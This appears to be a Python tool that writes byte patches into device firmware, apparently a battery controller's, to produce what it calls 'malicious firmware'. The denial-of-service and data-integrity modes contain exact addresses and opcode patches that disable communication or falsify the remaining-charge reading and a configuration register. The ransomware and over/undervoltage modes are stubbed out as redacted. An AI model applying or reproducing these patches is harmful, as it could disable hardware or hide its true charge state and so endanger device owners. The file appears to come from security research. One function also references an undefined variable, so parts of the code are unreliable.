global binary_data


def modify_byte_sequence(start_address, new_sequence):
    global binary_data
    try:
        max_address = start_address + len(new_sequence)

        # Extend bytearray if the address exceeds the current length
        if max_address > len(binary_data):
            binary_data.extend(bytearray(max_address - len(binary_data)))

        # Modify the byte sequence in the global variable
        for i, byte in enumerate(new_sequence):
            binary_data[start_address + i] = byte

        print("Byte sequence modified successfully.")

    except Exception as e:
        print(f"Error while modifying the byte sequence: {e}")

def create_126_firmware(selected_firmware, data):
    global binary_data
    binary_data = data
    print("\nCreating malicious firmware...")
    if(selected_firmware == "Denial of Service"):
        print("address        old         patch        description\n")
        print("b353           a655        a6ee         LD A,#0xEE || disable communication\n")
        modify_byte_sequence(0x2353,[0xA6,0xEE])
        return True
    elif (selected_firmware == "Ransomware"):
        # redacted for safety reasons
        return True

    elif (selected_firmware == "Undervoltage Attack"):
        # redacted for safety reasons
        return True

    elif (selected_firmware == "Overvoltage Attack"):
        # redacted for safety reasons
        return True


    elif (selected_firmware == "Data Integrity Attack"):

        print("address        old         patch        description\n")
        print("b8a1           c704b6      ccc592       JP LAB_c592 || jump into new code\n")
        print("===\n")
        print("c592           ?           3530000c     MOV RC, #0x30 || load 0x30 in DAT_000c\n")
        print("c596           ?           b00c         SUB A, RC || subtract from original percentage 30\n")
        print("c598           ?           c704b6       LD RemainingPercentage, A || load into variable\n")
        print("c59b           ?           ccb8a4       JP LAB_b8a4\n")
        print("===\n")
        print("ad6b           c704b6      ccc59e       JP LAB_c59e || jump into new code\n")
        print("===\n")
        print("c59e           ?           3530000c     MOV RC, #0x30 || load 0x30 in DAT_000c\n")
        print("c5a2           ?           b00c         SUB A, RC || subtract from original percentage 30\n")
        print("c5a4           ?           c704b6       LD RemainingPercentage, A || load into variable\n")
        print("c5a7           ?           ccad6e       JP LAB_ad6e\n")


        modify_byte_sequence(0x1d6b,[0xcc,0xc5,0x9e])
        modify_byte_sequence(0x28a1,[0xcc,0xc5,0x92])
        modify_byte_sequence(0x3592,[0x35,0x30,0x00,0x0c,0xb0,0x0c,0xc7,0x04,0xb6,0xcc,0xb8,0xa4,0x35,0x30,0x00,0x0c,0xb0,0x0c,0xc7,0x04,0xb6,0xcc,0xad,0x6e])

        return True

    else:
        print("\nNot yet implemented!")
        return False



def create_141_firmware(firmware,data):
    global binary_data
    binary_data = data
    print("\nCreating malicious firmware...")
    if(selected_firmware == "Denial of Service"):
        print("address        old         patch        description\nb40f           a655        a6ee         LD A,#0xEE || disable communication")
        modify_byte_sequence(0x240f,[0xA6,0xEE])
        return True

    elif (selected_firmware == "Data Integrity Attack"):

        print("address        old         patch        description\n")
        print("aac6           be02a6      ae0064       LDW X,0x64 || load 100% in X\n")
        print("aac9           32cdc1      ccc733       JP LAB_c733\n")
        print("aacc           31          9d           NOP\n")
        print("===\n")
        print("c733           ?           a632         LD A, #0x32\n")
        print("c735           ?           cdc131       CALL SetConfigReg()\n")
        print("c738           ?           ccaacd       JP LAB_aacd  || jump into legitimate code\n")
        print("===\n")
        print("c1de           ccc131      ccc73b       JP LAB_c73b\n")
        print("===\n")
        print("c73b           ?           ae0064       LDW X0x64\n")
        print("c73e           ?           a632         LD A, #0x32\n")
        print("c740           ?           ccc131       JP SetConfigReg()\n")


        modify_byte_sequence(0x1ac6,[0xae,0x00,0x64,0xcc,0xc7,0x33,0x9d])
        modify_byte_sequence(0x2554,[0x22,0x22])
        modify_byte_sequence(0x31df,[0xc7,0x3b])
        modify_byte_sequence(0x3733,[0xa6,0x32,0xcd,0xc1,0x31,0xcc,0xaa,0xcd,0xae,0x00,0x64,0xa6,0x32,0xcc,0xc1,0x31])

        return True

    else:
        print("\nNot yet implemented!")
        return False
